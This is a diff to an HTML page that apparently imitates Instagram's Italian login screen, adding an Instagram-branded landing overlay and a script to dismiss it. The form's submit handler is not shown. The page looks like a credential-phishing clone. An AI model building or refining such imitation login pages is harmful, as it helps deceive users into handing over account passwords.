@@ -13,15 +13,23 @@
 	<link rel="stylesheet" href="mobilestyle.css">
 	
 </head>
-<body>
+<body class="stop-scrolling">
 
 <div class="loading"></div>
+
+<div class="landing" id="landing">
+	<div class="landing-logo">
+		<img src= "img/instagram.png" alt="instagram" style="width: 175px;">
+	</div>
+	<p class="landing-info">Iscriviti per vedere le foto e i video dei tuoi amici.</p>
+	<button class="landing-open-app"><a href="instagram://mainfeed">Scarica l'app Instagram</a></button>
+	<p class="landing-login"><a onclick="closeLanding()">Accedi</a> o <a href="https://www.instagram.com/accounts/signup/phone">Iscriviti</a></p>
+</div>
 
 <div class="wrapper">
 <div class="language"> 
     <select name="languaguage"> <option value="it">Italiano</option> </select> 
  </div> 
-
 	<div class="header">
 		<div class="top">
 			<div class="logo">
@@ -50,7 +58,7 @@
 				</div>
 				<div class="dif">
 					<div class="forgot">
-						<a href="reset/">Hai dimenticato la password?</a>
+						<a href="/reset_password/reset/">Hai dimenticato la password?</a>
 					</div>
 				</div>
 				<div class="btn" onclick="sendMessage()" id="btn"><a href="#">Accedi</a></div>
@@ -105,6 +113,11 @@
 	   } else {
 		  document.getElementById("btn").style.background = "#b2dffc";
 	   }
+	}
+
+	function closeLanding(){
+		document.getElementById('landing').setAttribute("hidden","");
+		document.body.classList.remove("stop-scrolling");
 	}
  </script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
